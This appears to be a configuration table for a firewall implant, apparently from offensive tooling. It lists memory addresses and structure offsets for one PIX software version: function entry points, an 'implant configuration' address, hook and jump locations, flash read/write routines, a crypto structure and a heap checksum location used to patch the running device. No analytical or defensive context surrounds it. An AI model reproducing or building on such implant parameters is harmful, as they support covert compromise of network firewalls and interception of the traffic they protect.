; --- SECTION I ---
;
0x10080200            // pix version
0x6da000              // address of implant configuration
0x0   0x00cd7bb0      // allocb
0x1   0x00cd62c0      // freeb
0x2   0x001199e0      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x006880f0      // ip_put
0x4   0x00119b60      // close
0x5   0x01244278      // atoip
0x6   0x0122eef8      // memset
0x7   0x0124dbc8      // memmove
0x8   0x00cd6080      // malloc_call_calloc
0x9   0x0122f428      // free
0xa   0x0122e628      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x0123b378      // rand
0x15  0x00116aa0      // process_create
0x16  0x00117cb0      // process_suspend
0x17  0x00116570      // process_sleep_for
0x18  0x00a4e830      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x01569158      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x0068b560      // calc_ip_cksum
0x21  0x0068c870      // arp_loopkup
0x22  0x0068a8d0      // set_block_hdr_mac_and_proto
0x23  0x0069f230      // get hardware interface
0x24  0x009934b0      // get next hop
0x25  0x00000000      // get route
0x26  0x00685ce0      // send_it
0x27  0x0068ebc0      // arp_create
0x28  0x00ab8630      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001a4      // offset from cur_t that contains the current context number
0x2f  0x014d6bb8      // pointer to channnel list
0x30  0x013bf550      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x014e1b68      // max number of interface cards
0x35  0x015687f8      // internal_clock
0x36  0x00ab60b0      // get_interface_mac
0x37  0x0000014b      // offset to hardware interface number in interface struct
0x38  0x00            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000420      // offset to send channel in channel list
0x3b  0x005b20d0      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x005b21d0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x005b15d0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x005b1fd0      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x01584208      // address of context list
0x42  0x0123eebd      // checkheaps checksum location
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0086fa57      // address of our hook point
JmpLocation               0x008bdcf2      // address of our hook point
InterfaceAddr             0x013bf550      // same as 0x30 above
InterfaceLeng             0x000001c0      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x00000190      // interface name field offset
IntNumOffset              0x0000014b      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x0156ed68      // addr of crypto structure
ArpTableAddrPtr           0x013aed58      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
